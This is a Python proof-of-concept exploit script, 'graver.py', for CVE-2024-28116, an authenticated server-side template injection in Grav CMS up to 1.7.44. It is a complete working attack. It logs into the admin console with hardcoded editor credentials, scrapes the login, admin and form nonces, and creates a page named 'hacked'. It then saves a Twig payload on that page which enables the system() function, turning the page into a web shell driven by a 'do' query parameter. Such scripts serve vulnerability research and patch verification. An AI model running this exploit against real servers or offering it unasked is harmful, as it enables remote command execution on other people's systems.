# graver.py 
#
# Simple python PoC script that exploits an authenticated SSTI 
# vulnerability on Grav CMS versions <=1.7.44 (CVE-2024-28116), 
# which permits to execute OS commands on the remote web server. 
# It requires authentication on Grav CMS console with editor permissions, 
# then valid credentials must be hardcoded in the script.
#
#
# Copyright (C) 2024 Maurizio Siddu
#
#
# This program is free software: you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation, either version 3 of the License, or
# (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program.  If not, see <http://www.gnu.org/licenses/>


import requests
import re
import argparse
from urllib.parse import urlparse


##############################################
# Enter here your Grav CMS editor credentials
username = "youruser"
password="yourpassword"
##############################################


# Create an argument parser
parser = argparse.ArgumentParser(description="Command-line arguments parser")

# Add the targeturl argument
parser.add_argument("-t", "--target_url", required=True, help="Target url in the format 'http[s]://hostname'")
parser.add_argument("-p", "--port", type=int, default=80, help="Port number (default is 80)")

# Parse the command-line arguments
args = parser.parse_args()

# Set the target server and port
url = args.target_url
port = args.port


# Validate the targeturl argument
if not re.match(r'^(https?://\w+)', url):
    print("Error: Invalid target_url format. It should be in the format 'http://hostname' or 'https://hostname'")
    exit(1)

# Build the web console URL and get the hostname
url_admin = url+":"+str(port)+"/admin"
parsed_url = urlparse(url)
host = parsed_url.hostname


# Send the initial GET request to obtain session cookie and login-nonce
response = requests.get(url_admin)
response.raise_for_status()  # Raise an exception if the request fails

# Extract the session cookie and login-nonce
session_cookie = response.headers.get('Set-Cookie')
login_nonce_match = re.search(r'<input type="hidden" name="login-nonce" value="([^"]+)"', response.text)

if session_cookie and login_nonce_match:
    session_cookie = session_cookie.split(';', 1)[0]  # Remove any additional cookie attributes
    login_nonce = login_nonce_match.group(1)

    # Prepare the POST data
    post_data = {
        "data[username]": username,
        "data[password]": password,
        "task": "login",
        "login-nonce": login_nonce
    }

    # Set the headers for the POST request
    headers = {
        "Host": host,
        "Content-Type": "application/x-www-form-urlencoded",
        "Connection": "close",
        "Cookie": session_cookie
    }

    # Send the login POST request
    login_response = requests.post(url_admin, data=post_data, headers=headers)
    login_response.raise_for_status()

    # Check if the login response is a 303 redirect
    if login_response.status_code == 303:
        # Extract the new session cookie and the URL from the response
        new_session_cookie = login_response.headers.get('Set-Cookie')
        # Uncomment for Debug
        #print(f"Login response status: {login_response.status_code}")
        #print(f"Login session cookie: {new_session_cookie}")
        #print("Login response data:")
        #print(login_response.text)
        #print(login_response.headers)

        # Send the GET request to access the Grav console
        console_response = requests.get(url_admin, headers={"Cookie": new_session_cookie})
        console_response.raise_for_status()
        # Uncomment for Debug
        #print(f"Console access response status: {console_response.status_code}")
        #print("Console access response data:")
        #print(console_response.text)

        # Extract the "admin-nonce" parameter from the HTML content
        admin_nonce_match = re.search(r'admin_nonce: \'([^\']+)\'', console_response.text)
        if admin_nonce_match:
            admin_nonce = admin_nonce_match.group(1)
            # Uncomment for Debug
            #print(f"admin-nonce: {admin_nonce}")

            # Prepare the POST data for the next request
            page_name = "hacked"
            post_data = {
                "data[title]": page_name,
                "data[folder]": page_name,
                "data[route]": "",
                "data[name]": "default",
                "data[visible]": "1",
                "data[blueprint]": "",
                "task": "continue",
                "admin-nonce": admin_nonce
            }

            # Send the POST request to create the new page
            create_response = requests.post(url_admin, data=post_data, headers={"Cookie": new_session_cookie})
            create_response.raise_for_status()

            # Check if the response to the create-new-page POST request is successful
            if (create_response.status_code == 303 or create_response.status_code == 200):
                # Uncomment for Debug
                #print(f"Create New Page Response for admin/pages status: {create_response.status_code}")

                # Send the GET request to extract __unique_form_id__ and form-id values from response
                url_new_page = url_admin+"/pages/"+page_name+"/:add"
                new_page_response = requests.get(url_new_page, headers={"Cookie": new_session_cookie})
                new_page_response.raise_for_status()
                # Uncomment for Debug
                #print(f"New-page response status: {new_page_response.status_code}")
                #print("New-page response data:")
                #print(new_page_response.text)

                # Extract the "form-nonce" and "__unique_form_id__" parameters from the response body
                form_nonce_match = re.search(r'<input type="hidden" name="form-nonce" value="([^"]+)"', new_page_response.text)
                unique_form_id_match = re.search(r'<input type="hidden" name="__unique_form_id__" value="([^"]+)"', new_page_response.text)
                if form_nonce_match and unique_form_id_match:
                    form_nonce = form_nonce_match.group(1)
                    unique_form_id = unique_form_id_match.group(1)
                    # Uncomment for Debug
                    #print(f"form-nonce: {form_nonce}")
                    #print(f"__unique_form_id__: {unique_form_id}")

                    # Prepare the POST data for the injection request
                    post_data = {
                        "task": "save",
                        "data[header][title]": page_name,
                        "data[content]": "{% set arr = {'1': 'system', '2':'foo'} %}\n{% set dump = print_r(grav.twig.twig_vars['config'].set('system.twig.safe_functions', arr)) %}\n{% set cmd = uri.query('do') is empty ? 'whoami' : uri.query('do') %}\n<pre>Cmd-Output:</pre>\n<h5>{{ system(cmd) }}</h5>",
                        "data[folder]": page_name,
                        "data[route]": "",
                        "data[name]": "default",
                        "data[header][body_classes]": "",
                        "data[ordering]": "1",
                        "data[order]": "",
                        "toggleable_data[header][process]": "on",
                        "data[header][process][markdown]": "1",
                        "data[header][process][twig]": "1",
                        "data[header][order_by]": "",
                        "data[header][order_manual]": "",
                        "data[blueprint]": "",
                        "data[lang]": "",
                        "_post_entries_save": "edit",
                        "__form-name__": "flex-pages",
                        "__unique_form_id__": unique_form_id,
                        "form-nonce": form_nonce,
                        "toggleable_data[header][published]": "0",
                        "toggleable_data[header][date]": "0",
                        "toggleable_data[header][publish_date]": "0",
                        "toggleable_data[header][unpublish_date]": "0",
                        "toggleable_data[header][metadata]": "0",
                        "toggleable_data[header][dateformat]": "0",
                        "toggleable_data[header][menu]": "0",
                        "toggleable_data[header][slug]": "0",
                        "toggleable_data[header][redirect]": "0",
                        "toggleable_data[header][twig_first]": "0",
                        "toggleable_data[header][never_cache_twig]": "0",
                        "toggleable_data[header][child_type]": "0",
                        "toggleable_data[header][routable]": "0",
                        "toggleable_data[header][cache_enable]": "0",
                        "toggleable_data[header][visible]": "0",
                        "toggleable_data[header][debugger]": "0",
                        "toggleable_data[header][template]": "0",
                        "toggleable_data[header][append_url_extension]": "0",
                        "toggleable_data[header][redirect_default_route]": "0",
                        "toggleable_data[header][routes][default]": "0",
                        "toggleable_data[header][routes][canonical]": "0",
                        "toggleable_data[header][routes][aliases]": "0",
                        "toggleable_data[header][admin][children_display_order]": "0",
                        "toggleable_data[header][login][visibility_requires_access]": "0",
                        "toggleable_data[header][permissions][inherit]": "0",
                        "toggleable_data[header][permissions][authors]": "0",
                    }

                    # Send the final POST request to inject the payload on the page previously created 
                    inj_response = requests.post(url_new_page, data=post_data, headers={"Cookie": new_session_cookie})
                    inj_response.raise_for_status()

                    # Check if the injection response is successful
                    if (inj_response.status_code == 303 or inj_response.status_code == 200):
                        # Uncomment for Debug
                        #print(f"Injection response status: {injfinal_response.status_code}")

                        # Check the updated page following the final redirection
                        final_location = url_admin+"/pages/"+page_name
                        final_redirect_response = requests.get(final_location, headers={"Cookie": new_session_cookie})
                        final_redirect_response.raise_for_status()
                        # Uncomment for Debug
                        #print(f"Final redirect response status: {final_redirect_response.status_code}")
                        #print("Final redirect response data:")
                        #print(final_redirect_response.text)

                        print("RCE payload injected, now visit the malicious page at: "+url+":"+str(port)+"/"+page_name+"?do=")
                    else:
                        print("[E] Failed to inject the RCE payload, the injection response has not status 303 or 200...")
                else:
                    print("[E] Could not find 'form-nonce' and '__unique_form_id__' in the response body...")
            else:
                print("[E] Failed to create a new page, the response has not status 303 or 200...")
        else:
            print("[E] Could not find 'admin-nonce' in the Login response body...")
    else:
        print("[E] Login failed, the response is not a 303 redirect...")
else:
    print("[E] Could not extract session cookie and login-nonce from the pre-login response...")
